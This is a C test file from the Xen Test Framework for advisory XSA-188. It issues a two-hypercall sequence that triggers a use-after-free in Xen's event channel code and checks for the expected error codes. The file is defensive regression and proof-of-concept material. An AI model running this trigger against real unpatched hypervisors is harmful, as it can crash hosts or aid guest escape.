/**
 * @file tests/xsa-188/main.c
 * @ref test-xsa-188
 *
 * @page test-xsa-188 XSA-188
 *
 * Advisory: [XSA-188](http://xenbits.xen.org/xsa/advisory-188.html)
 *
 * EVTCHNOP_init_control with an invalid control_gfn will correctly
 * fail and free resources but incorrectly leaves a pointer to freed
 * memory.
 *
 * A subsequent EVTCHNOP_expand_array call (for example) will use this
 * freed memory.
 *
 * @see tests/xsa-188/main.c
 */
#include <xtf.h>
#include <arch/mm.h>

const char test_title[] = "XSA-188 PoC";

static uint8_t array_page[PAGE_SIZE] __aligned(PAGE_SIZE);

void test_main(void)
{
    struct evtchn_init_control init_control;
    struct evtchn_expand_array expand_array;
    int ret;

    /* 1. EVTCHNOP_init_control with bad GFN. */
    init_control.control_gfn = (uint64_t)-2;
    init_control.offset = 0;
    init_control.vcpu = 0;

    ret = hypercall_event_channel_op(EVTCHNOP_init_control, &init_control);
    if ( ret != -EINVAL )
        xtf_failure("EVTCHNOP_init_control returned %d (!= %d)\n", ret, -EINVAL);

    /* 2. EVTCHNOP_expand_array. */
    expand_array.array_gfn = virt_to_gfn(array_page);

    ret = hypercall_event_channel_op(EVTCHNOP_expand_array, &expand_array);
    if ( ret != -ENOSYS && ret != -EOPNOTSUPP )
        xtf_failure("EVTCHNOP_expand_array returned %d (!= %d or %d)\n",
                    ret, -ENOSYS, -EOPNOTSUPP);

    xtf_success(NULL);
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
